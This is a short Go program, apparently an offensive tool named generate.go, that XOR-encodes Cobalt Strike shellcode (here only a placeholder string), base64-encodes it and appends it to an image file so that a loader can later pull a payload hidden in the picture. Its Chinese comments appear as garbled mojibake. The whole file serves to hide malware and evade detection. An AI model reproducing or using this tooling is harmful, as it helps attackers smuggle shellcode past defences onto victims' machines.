package main

import (
	"encoding/base64"
	"fmt"
	"os"
)

const (
	KEY_1 = 22
	KEY_2 = 44
)

func main() {
	var xor_shellcode []byte
	xor_shellcode = []byte{"CS���ɵ�Java shellcode"}
	/*xor_shellcode =[]byte{0xfc, 0x48,...}*/
	var shellcode []byte
	for i := 0; i < len(xor_shellcode); i++ {
		//���ｫ������shellcode�����������ٸ�shellcode��Ƭ
		shellcode = append(shellcode, xor_shellcode[i]^KEY_1^KEY_2)
	}
	//����base64���� ׼��д��jpeg��
	encodeBaseStr := base64.StdEncoding.EncodeToString(shellcode)
	fileName := os.Args[1]
	if len(fileName) == 0 {
		fmt.Println("[-]usage:run generate.go pic_path")
		os.Exit(0)
	}
	//����һ���ļ�����׷������
	f, err := os.OpenFile(fileName, os.O_CREATE|os.O_RDWR|os.O_APPEND, os.ModeAppend|os.ModePerm)
	if err != nil {
		fmt.Println(err)
	}
	//�������ܲ���base64���shellcode׷��д�뵽ͼƬ���
	f.WriteString(encodeBaseStr)
	f.Close()
	fmt.Println("write success")
}
